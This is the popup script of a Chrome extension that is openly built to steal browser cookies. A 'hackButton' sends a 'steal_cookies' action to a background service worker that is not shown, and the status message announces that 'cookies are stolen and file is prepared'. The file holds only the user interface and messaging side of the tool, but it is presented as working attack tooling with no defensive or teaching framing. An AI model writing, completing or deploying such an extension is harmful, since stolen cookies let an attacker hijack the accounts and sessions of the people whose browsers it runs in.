// popup.js
document.addEventListener('DOMContentLoaded', function() {
    const hackButton = document.getElementById('hackButton');
    const statusDiv = document.getElementById('status');

    hackButton.addEventListener('click', async () => {
        statusDiv.innerHTML = '<span style="color: #f39c12;">⏳ Processing... Please wait while cookies are stolen and file is prepared. 🧑‍💻</span>';
        hackButton.disabled = true;

        // Send a message to the background service worker
        try {
            const response = await chrome.runtime.sendMessage({ 
                action: "steal_cookies" 
            });

            if (response && response.success) {
                statusDiv.innerHTML = `<strong style="color: green;">✅ Success! ${response.message} 📂</strong>`;
            } else {
                statusDiv.innerHTML = `<strong style="color: red;">❌ Failure! ${response.error || 'An unknown error occurred.'} 💥</strong>`;
            }

        } catch (error) {
            statusDiv.innerHTML = `<strong style="color: darkred;">🚨 Critical Error: ${error.message} 🛑</strong>`;
        } finally {
            hackButton.disabled = false;
        }
    });
});
